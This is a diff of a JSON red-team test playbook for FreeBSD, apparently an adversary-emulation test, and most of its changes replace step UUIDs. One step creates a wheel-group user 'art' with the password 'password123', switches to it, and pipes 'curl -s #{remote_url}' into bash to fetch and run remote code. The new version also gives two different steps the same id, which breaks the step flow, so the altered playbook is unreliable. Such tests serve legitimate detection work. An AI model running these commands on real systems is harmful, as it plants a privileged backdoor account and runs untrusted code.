@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "a8638b9e-a5a4-4a17-970d-2b519d40fad8",
+      "id": "0062a248-aa3c-51af-af55-689e2ff09255",
       "type": "execute-command",
       "data": {
         "command": "pw adduser art -g wheel -s /bin/sh\necho \"password123\" | pw usermod art -h 0\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "fa3f1707-814f-4667-99e2-c4bcb40936c5",
+      "id": "79bdd3e9-6118-5ed4-a702-1b4af9f8ae99",
       "type": "execute-command",
       "data": {
         "command": "rmuser -y art",
@@ -25,7 +25,7 @@
       "elevation_required": true
     },
     {
-      "id": "b2648cb3-1584-4a25-af11-4c008dc555ce",
+      "id": "e3901a37-e05b-5989-9ace-078ac2342af1",
       "name": "Check dependency 1/1",
       "description": "Check if running on a FreeBSD based machine.\n",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": true
     },
     {
-      "id": "9824b721-732a-4872-b289-53171329fe0a",
+      "id": "8d897f0c-953e-5098-826d-45e82ad24759",
       "name": "Resolve dependency 1/1",
       "description": "Check if running on a FreeBSD based machine.\n",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": true
     },
     {
-      "id": "20e8b842-dcb0-4070-9400-020e3b951f06",
+      "id": "e3901a37-e05b-5989-9ace-078ac2342af1",
       "name": "Re-check dependency 1/1",
       "description": "Check if running on a FreeBSD based machine.\n",
       "type": "execute-command",
@@ -60,34 +60,34 @@
   ],
   "flows": [
     {
-      "s": "a8638b9e-a5a4-4a17-970d-2b519d40fad8",
+      "s": "0062a248-aa3c-51af-af55-689e2ff09255",
       "p": "on-success",
-      "o": "fa3f1707-814f-4667-99e2-c4bcb40936c5"
+      "o": "79bdd3e9-6118-5ed4-a702-1b4af9f8ae99"
     },
     {
-      "s": "a8638b9e-a5a4-4a17-970d-2b519d40fad8",
+      "s": "0062a248-aa3c-51af-af55-689e2ff09255",
       "p": "on-failure",
-      "o": "fa3f1707-814f-4667-99e2-c4bcb40936c5"
+      "o": "79bdd3e9-6118-5ed4-a702-1b4af9f8ae99"
     },
     {
-      "s": "b2648cb3-1584-4a25-af11-4c008dc555ce",
+      "s": "e3901a37-e05b-5989-9ace-078ac2342af1",
       "p": "on-success",
-      "o": "a8638b9e-a5a4-4a17-970d-2b519d40fad8"
+      "o": "0062a248-aa3c-51af-af55-689e2ff09255"
     },
     {
-      "s": "b2648cb3-1584-4a25-af11-4c008dc555ce",
+      "s": "e3901a37-e05b-5989-9ace-078ac2342af1",
       "p": "on-failure",
-      "o": "9824b721-732a-4872-b289-53171329fe0a"
+      "o": "8d897f0c-953e-5098-826d-45e82ad24759"
     },
     {
-      "s": "9824b721-732a-4872-b289-53171329fe0a",
+      "s": "8d897f0c-953e-5098-826d-45e82ad24759",
       "p": "on-success",
-      "o": "20e8b842-dcb0-4070-9400-020e3b951f06"
+      "o": "e3901a37-e05b-5989-9ace-078ac2342af1"
     },
     {
-      "s": "20e8b842-dcb0-4070-9400-020e3b951f06",
+      "s": "e3901a37-e05b-5989-9ace-078ac2342af1",
       "p": "on-failure",
-      "o": "a8638b9e-a5a4-4a17-970d-2b519d40fad8"
+      "o": "0062a248-aa3c-51af-af55-689e2ff09255"
     }
   ],
   "tags": [
